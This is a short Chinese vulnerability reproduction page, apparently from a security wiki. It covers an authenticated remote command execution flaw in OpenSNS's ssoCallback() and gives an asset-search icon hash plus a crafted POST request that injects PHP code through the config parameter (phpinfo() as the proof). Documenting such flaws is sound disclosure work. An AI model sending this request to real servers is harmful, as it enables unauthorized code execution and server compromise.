---
title: "OpenSNS AuthorizeController.class.php 后台远程命令执行漏洞"
date: 2026-10-12 09:00:48
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "OpenSNS"
tags:
  - "OpenSNS"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

OpenSNS AuthorizeController.class.php文件 ssoCallback() 函数存在命令执行漏洞，在登录的情况下可以获取服务器权限

## 漏洞影响

```
OpenSNS
```

## 网络测绘

```
icon_hash="1167011145"
```

## 漏洞复现

登录页面如下

![image-20220518154117028](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181541097.png)

存在漏洞的文件为 `Application/Admin/Controller/AuthorizeController.class.php`

![image-20220518154127216](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181541309.png)

其中 config参数可控，构造请求就可以通过 file_put_contents 写入执行任意命令

![image-20220518154143157](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181541252.png)

构造请求包

```
POST /admin.php?s=/Authorize/ssoCallback\

config[SSO_CONFIG]=phpinfo();
```

![image-20220518154206103](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181542195.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/OpenSNS-AuthorizeController.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
